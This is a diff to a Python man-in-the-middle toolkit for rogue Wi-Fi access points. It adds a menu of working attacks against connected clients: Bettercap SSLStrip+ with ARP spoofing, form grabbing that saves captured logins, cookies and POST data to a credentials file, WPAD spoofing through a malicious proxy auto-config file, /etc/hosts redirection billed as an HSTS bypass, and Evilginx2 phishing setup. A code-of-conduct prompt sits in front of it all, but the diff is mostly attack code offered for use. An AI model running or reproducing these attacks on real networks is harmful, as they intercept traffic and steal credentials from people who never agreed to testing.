@@ -9,6 +9,9 @@ import ipaddress
 import sys
 import shutil
 import threading
+import signal
+import atexit
+from typing import List, Optional
 
 # ANSI color codes
 RED     = "\033[91m"
@@ -27,11 +30,24 @@ def check_root():
         sys.exit(1)
 
 
+
 def accept_code_of_conduct():
-    """Displays a disclaimer and code of conduct, and requires the user's acceptance."""
-    conduct_text = """
+    """Displays a disclaimer and code of conduct, and requires the user's acceptance once per version."""
+    CURRENT_VERSION = "v0.3"
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    agreement_file = os.path.join(script_dir, ".fapa_agreement")
+
+    # Check if agreement file exists and matches current version
+    if os.path.exists(agreement_file):
+        with open(agreement_file, "r") as f:
+            agreed_version = f.read().strip()
+        if agreed_version == CURRENT_VERSION:
+            return  # Already accepted for this version
+
+    # Display agreement
+    conduct_text = f"""
 ====================================================================
-        Code of Conduct and Disclaimer
+        Code of Conduct and Disclaimer - Version {CURRENT_VERSION}
 ====================================================================
 This tool is provided solely for research and ethical testing purposes.
 
@@ -45,10 +61,16 @@ By continuing, you confirm that:
    - You will use this tool only for ethical research purposes.
 
 Type "I agree" to accept and continue: """
+    
     response = input(YELLOW + conduct_text + RESET)
     if response.strip().lower() != "i agree":
         print(RED + "[-] Code of conduct not accepted. Exiting..." + RESET)
         sys.exit(1)
+
+    # Save version agreement locally
+    with open(agreement_file, "w") as f:
+        f.write(CURRENT_VERSION)
+
 
 
 def check_for_updates():
@@ -136,6 +158,9 @@ def install_dependencies():
         "tcpdump": "tcpdump",
         "gnome-terminal": "gnome-terminal",
         "scapy": "scapy",
+        "apache2": "apache2",  # Para WPAD spoofing
+        "golang-go": "golang-go",  # Para Evilginx2
+        "git": "git"  # Para Evilginx2
     }
     
     for key, package in packages.items():
@@ -147,12 +172,11 @@ def install_dependencies():
                 print(RED + f"[-] Error installing {package}:" + RESET)
                 print(RED + install.stderr + RESET)
                 
-    # Update Python dependencies to resolve conflicts with bcrypt and passlib
-    print(GREEN + "[+] Upgrading Python dependencies (bcrypt and passlib)..." + RESET)
-    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=False)
-    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "bcrypt", "passlib"], check=False)
+    # Python dependencies
+    print(GREEN + "[+] Upgrading Python dependencies..." + RESET)
+    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip", "requests", "scapy"], check=False)
     
-    # Install Evilginx2 if it is not installed
+    # Install Evilginx2 if not installed
     install_evilginx2()
 
 
@@ -416,6 +440,34 @@ def monitor_clients():
     stop_event.set()
     t.join(timeout=1)
     print(GREEN + "Monitoring stopped." + RESET)
+    
+def get_connected_clients():
+    """Returns list of connected clients with their IPs"""
+    clients = []
+    leases = get_dhcp_leases()
+    stations = get_connected_stations()
+    
+    for station in stations:
+        mac = station.get("MAC", "").lower()
+        if mac in leases:
+            clients.append({
+                "MAC": mac,
+                "IP": leases[mac]["IP"],
+                "hostname": leases[mac]["hostname"]
+            })
+    return clients
+
+def show_connected_clients():
+    """Displays connected clients in a legible manner"""
+    clients = get_connected_clients()
+    if not clients:
+        print(RED + "[-] No connected clients found." + RESET)
+        return None
+    
+    print(GREEN + "[+] Connected clients:" + RESET)
+    for i, client in enumerate(clients, 1):
+        print(CYAN + f"  [{i}] IP: {client['IP']} | MAC: {client['MAC']} | Hostname: {client['hostname']}" + RESET)
+    return clients    
 
 
 def start_mitm_attack():
@@ -458,6 +510,249 @@ def start_mitm_attack():
         print(GREEN + "MITM attack stopped. Check the log at:" + RESET, log_path)
     except Exception as e:
         print(RED + "Error starting Bettercap in a new terminal window:" + str(e) + RESET)
+        
+
+class MITMAttacker:
+    def __init__(self, interface: str = None):
+        self.interface = interface or ap_interface_global
+        self.background_processes = []
+        self.modified_files = {}
+        self.is_running = False
+        
+        # Register cleanup on normal program exit
+        atexit.register(self.cleanup)
+
+    def _run_command(self, command: str, background: bool = False) -> Optional[subprocess.Popen]:
+        """Run shell commands with background option and process tracking."""
+        try:
+            if background:
+                process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
+                self.background_processes.append(process)
+                return process
+            return subprocess.run(command, shell=True, check=True)
+        except subprocess.CalledProcessError as e:
+            print(RED + f"[-] Command failed: {e}" + RESET)
+            return None
+
+    def cleanup(self):
+        """Revert all changes and stop running processes."""
+        print(YELLOW + "[!] Cleaning up..." + RESET)
+        
+        # Stop all background processes
+        self.stop_all_processes()
+        
+        # Restore modified files
+        self._restore_modified_files()
+        
+        # Stop Apache if we started it
+        if hasattr(self, '_apache_started_by_us'):
+            self._run_command("sudo systemctl stop apache2")
+            print(GREEN + "[+] Apache service stopped" + RESET)
+        
+        print(GREEN + "[+] Cleanup complete" + RESET)
+
+    def _restore_modified_files(self):
+        """Restore any files we modified during attacks."""
+        for original, backup in self.modified_files.items():
+            try:
+                self._run_command(f"sudo cp {backup} {original}")
+                print(GREEN + f"[+] Restored original {original}" + RESET)
+            except Exception as e:
+                print(RED + f"[-] Failed to restore {original}: {e}" + RESET)
+
+    def stop_all_processes(self):
+        """Stop all background processes we started."""
+        for process in self.background_processes:
+            try:
+                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+                process.wait(timeout=5)
+                print(GREEN + f"[+] Stopped process {process.pid}" + RESET)
+            except (ProcessLookupError, subprocess.TimeoutExpired) as e:
+                print(RED + f"[-] Failed to stop process {process.pid}: {e}" + RESET)
+        self.background_processes = []
+
+    def start_sslstrip_plus(self, target_ip: str):
+        """Run Bettercap with SSLStrip+ in a new terminal without blocking the main terminal."""
+        if not self.interface:
+            print(RED + "[-] No interface configured." + RESET)
+            return
+
+        print(GREEN + f"[+] Starting SSLStrip+ on the interface {self.interface}..." + RESET)
+        print(CYAN + """
+[HELP]:
+- Bettercap will run with:
+* SSLStrip+ enabled
+* ARP spoofing to the target
+""" + RESET)
+
+        # Command to run Bettercap in a new terminal without blocking the main terminal
+        cmd = (
+            f"gnome-terminal -- bash -c 'sudo bettercap -iface {self.interface} "
+            f"-eval \"set http.proxy.sslstrip true; "
+            f"set arp.spoof.targets {target_ip}; "
+            f"arp.spoof on; http.proxy on; "
+            f"set events.stream.output ~/bettercap_sslstrip.log; "
+            f"events.stream on\"; exec bash'"
+        )
+
+        try:
+            # Open a new terminal and run the command without blocking the main terminal
+            subprocess.Popen(cmd, shell=True)
+            print(CYAN + "[*] SSLStrip+ started in a new terminal." + RESET)
+        except Exception as e:
+            print(RED + "[-] Error starting SSLStrip+ in a new terminal:", str(e) + RESET)
+
+        self.is_running = True
+        
+    def form_grabbing_submenu(self):
+        """Muestra el submenú para Form Grabbing"""
+        while True:
+            print(BLUE + """
+[Form Grabbing Submenu]
+  1) Start Form Grabbing
+  2) View captured credentials
+  3) Back to Main Menu
+""" + RESET)
+
+            option = input(YELLOW + "Select an option: " + RESET).strip()
+
+            if option == "1":
+                self.start_form_grabbing()
+            elif option == "2":
+                self.view_captured_credentials()
+            elif option == "3":
+                break  # Vuelve al menú principal
+            else:
+                print(RED + "[-] Invalid option, please try again." + RESET)
+
+
+    def start_form_grabbing(self, output_file: str = "creds.txt"):
+        """Captura credenciales con manejo de archivo de salida"""
+        output_path = os.path.expanduser(f"~/{output_file}")
+        self._run_command(f"touch {output_path}")
+        self._run_command(f"chmod 666 {output_path}")
+        print(GREEN + f"[+] Getting started Form Grabbing, the results will be saved in {output_path}" + RESET)
+        print(CYAN + """
+[HELP]:
+- Bettercap will capture:
+* HTTP/HTTPS credentials from forms
+* Authentication cookies
+* POST data from login forms
+- Results will be saved automatically
+""" + RESET)
+
+        # Comando para ejecutar Bettercap en un nuevo terminal para Form Grabbing
+        cmd = f"gnome-terminal -- bash -c 'sudo bettercap -iface {self.interface} -eval \"set http.proxy.sslstrip true; http.proxy on; set http.proxy.form.output {output_path}; set http.proxy.form.enable true; events.stream on\"; exec bash'"
+
+        try:
+            # Abre un nuevo terminal y ejecuta el comando sin bloquear el principal
+            subprocess.Popen(cmd, shell=True)
+            print(CYAN + "[*] Form Grabbing started on a new terminal." + RESET)
+        except Exception as e:
+            print(RED + "[-] Error starting Form Grabbing on a new terminal: ", str(e) + RESET)
+
+        self.is_running = True
+
+    def view_captured_credentials(self, output_file: str = "creds.txt"):
+        """Muestra las credenciales capturadas desde el archivo"""
+        output_path = os.path.expanduser(f"~/{output_file}")
+        if os.path.exists(output_path):
+            with open(output_path, "r") as file:
+                credentials = file.read()
+                print(GREEN + f"[+] Credentials captured from {output_path}:\n" + RESET)
+                print(CYAN + credentials + RESET)
+        else:
+            print(RED + f"[-] The file {output_file} does not exist or is empty." + RESET)
+
+
+    def setup_wpad_spoofing(self, proxy_ip: str = "192.168.1.1"):
+        """Configure WPAD with automatic monitoring and cleanup."""
+        # Check if Apache is running
+        apache_status = subprocess.run("systemctl is-active apache2", 
+                                     shell=True, 
+                                     stdout=subprocess.PIPE)
+        self._apache_started_by_us = (apache_status.returncode != 0)
+        
+        if self._apache_started_by_us:
+            self._run_command("sudo systemctl start apache2")
+        
+        # Backup original hosts file if we haven't already
+        if "/etc/hosts" not in self.modified_files:
+            self.modified_files["/etc/hosts"] = "/etc/hosts.bak"
+            self._run_command("sudo cp /etc/hosts /etc/hosts.bak")
+            
+
+        print(GREEN + "[+] Configuring WPAD Spoofing..." + RESET)        
+        # Configure WPAD
+        wpad_content = f"""function FindProxyForURL(url, host) {{
+    return "PROXY {proxy_ip}:8080";
+}}"""
+        
+        os.makedirs("/var/www/html", exist_ok=True)
+        with open("/var/www/html/wpad.dat", "w") as f:
+            f.write(wpad_content)
+        print(GREEN + "[+] WPAD file created at /var/www/html/wpad.dat" + RESET)    
+        
+        print(CYAN + """
+[HELP]:
+- A malicious wpad.dat file will be created
+- Apache will serve the file at http://<your-IP>/wpad.dat
+- Access monitor will open in a new terminal
+- Clients with automatic proxy enabled will be redirected
+- [!] Make sure a proxy is listening on port 8080 (e.g., mitmproxy or bettercap)
+""" + RESET)
+        
+        # Monitor access.log
+        monitor_cmd = (
+        "gnome-terminal -- bash -c 'sudo tail -f /var/log/apache2/access.log "
+        "| grep --color=always \"wpad.dat\\|POST\\|GET\" ; exec bash'")
+        self._run_command(monitor_cmd, background=True)
+
+    def bypass_hsts(self, domains: List[str]):
+        """HSTS Bypass with proper file restoration."""
+        if not domains:
+            return
+        print(GREEN + "[+] Configurando HSTS Bypass..." + RESET)
+        print(CYAN + """
+[HELP]:
+- /etc/hosts will be modified to redirect domains
+- Requires the attacker to have web service on 80/443
+- For best effect, combine with:
+* SSLStrip+
+* Fake web server (e.g., Evilginx2)
+""" + RESET)
+           
+            
+        # Backup original hosts file if we haven't already
+        if "/etc/hosts" not in self.modified_files:
+            self.modified_files["/etc/hosts"] = "/etc/hosts.bak"
+            self._run_command("sudo cp /etc/hosts /etc/hosts.bak")
+        
+        # Add entries
+        with open("/etc/hosts", "a") as f:
+            f.write("\n# HSTS Bypass\n")
+            your_ip = get_interface_ip(self.interface) or "192.168.1.1"
+            for domain in domains:
+                if domain.strip():
+                    f.write(f"{your_ip} {domain.strip()}\n")
+                    f.write(f"{your_ip} www.{domain.strip()}\n")
+                    
+        print(GREEN + f"[+] HSTS bypass configured for: {', '.join(domains)}" + RESET)
+        print(YELLOW + "[!] For this to work, you must be running a web server on this machine." + RESET)
+        print(GREEN + f"[+] Traffic redirection for HSTS Bypass is active on {self.interface}" + RESET)
+        print(GREEN + "[+] Monitoring for requests to the specified domains is now enabled." + RESET)
+        print(CYAN + f"[INFO] You can monitor manually in another terminal to watch live traffic:\n    sudo tcpdump -i {self.interface} port 80 or port 443 | grep \"{'|'.join(domains)}\"" + RESET)
+
+                    
+        
+        # Monitor traffic
+        monitor_cmd = (
+        f"gnome-terminal -- bash -c 'echo \"HSTS Bypass Traffic Monitor:\"; "
+        f"sudo tcpdump -i {self.interface} port 80 or port 443 "
+        f"| grep --color=always \"{'\\|'.join(domains)}\" ; exec bash'")
+        self._run_command(monitor_cmd, background=True)
+
+        
 
 
 def select_target():
@@ -1225,25 +1520,57 @@ def start_advanced_mitm_attack():
 
 
 def start_mitm_menu():
+    attacker = MITMAttacker()
+    
     while True:
         print(BLUE + """
-Select the type of MITM attack:
+[ENHANCED MITM MENU]
   1) ARP Spoofing (Bettercap)
-  2) DNS Spoofing (Ettercap, GUI mode with caplet)
+  2) DNS Spoofing (Ettercap)
   3) Proxy MITM (mitmproxy)
-  4) Advanced MITM Attack (Evilginx2)
-  5) Back to Main Menu
+  4) Advanced MITM (Evilginx2)
+  5) SSLStrip+ (Start SSL Stripping)
+  6) Form Grabbing (Start Form Grabbing)
+  7) WPAD Spoofing (Proxy Auto)
+  8) HSTS Bypass
+  9) Monitor All Traffic
+  10) Back to Main Menu
 """ + RESET)
-        option = input(YELLOW + "Enter your choice: " + RESET).strip()
+        option = input(YELLOW + "Select an option: " + RESET).strip()
+        
         if option == "1":
-            start_mitm_attack()
+            start_mitm_attack()  
         elif option == "2":
-            start_dns_spoof_attack()
+            start_dns_spoof_attack()  
         elif option == "3":
-            start_proxy_mitm_attack()
+            start_proxy_mitm_attack()  
         elif option == "4":
-            start_advanced_mitm_attack()
+            start_advanced_mitm_attack()  
         elif option == "5":
+            target = select_target()
+            if target and target.get("IP"):
+                attacker.start_sslstrip_plus(target["IP"])
+        elif option == "6":
+            target = select_target()
+            if target and target.get("IP"):
+                attacker.form_grabbing_submenu()
+        elif option == "7":
+            proxy_ip = input(YELLOW + "Enter proxy IP [192.168.1.1]: " + RESET).strip() or "192.168.1.1"
+            attacker.setup_wpad_spoofing(proxy_ip)
+        elif option == "8":
+            domains = input(YELLOW + "Enter domains to bypass (comma separated): " + RESET).strip()
+            if domains:
+                attacker.bypass_hsts([d.strip() for d in domains.split(",") if d.strip()])
+        elif option == "9":
+            iface = attacker.interface or ap_interface_global
+            if not iface:
+                print(RED + "[-] No interface is configured for monitoring." + RESET)
+                return
+            output_file = os.path.join(os.getcwd(), "mitm_capture.pcap")    
+            print(GREEN + f"[+] Opening full traffic monitor on interface {iface}. Capturing to {output_file}" + RESET)
+            cmd = f"gnome-terminal -- bash -c 'sudo tcpdump -i {iface} -w \"{output_file}\" ; exec bash'"
+            subprocess.run(cmd, shell=True)
+        elif option == "10":
             break
         else:
             print(RED + "[-] Invalid option, please try again.\n" + RESET)
